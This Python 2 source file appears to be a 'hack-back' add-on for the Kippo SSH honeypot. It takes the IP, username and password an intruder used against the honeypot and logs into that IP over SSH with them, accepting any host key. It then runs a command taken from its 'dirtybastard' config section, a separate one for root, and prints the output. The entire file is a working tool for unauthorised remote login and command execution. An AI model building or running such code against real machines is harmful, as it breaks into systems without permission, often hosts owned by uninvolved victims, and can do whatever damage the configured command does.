import threading
from paramiko import SSHClient, AutoAddPolicy
from kippo.core.config import config

class SSHLogin(object):
    def __init__(self, clientip,  username,  password):
        self.clientip = clientip
        self.username = username
        self.password = password
        
        # Launch login thread
        threading.Thread(target=self.loginThread).start()
        print "LOGIN THREAD LAUCHED."


    def loginThread(self):
            client = SSHClient()
            client.set_missing_host_key_policy(AutoAddPolicy())
        
            print "Attempting login with " + self.username + "@" + self.clientip +" (" + self.password + ")"
            
            try:
                client.connect(hostname=self.clientip,  username=self.username,  password=self.password)
            except:   
                print "Authentication failed for root@" + self.clientip + " (" + self.password + ")"
                return
                
            configName = "not_root_command"
            if (self.username == "root"):
                configName = "root_command"

            command = config().get('dirtybastard',  configName)[1:-1] # Remove quotes
                
            print "SUCCESS! Running command: " + command
            stdin, stdout, stderr = client.exec_command(command)
        
            print "stdout:"
            for line in stdout.readlines():
                print line.strip()
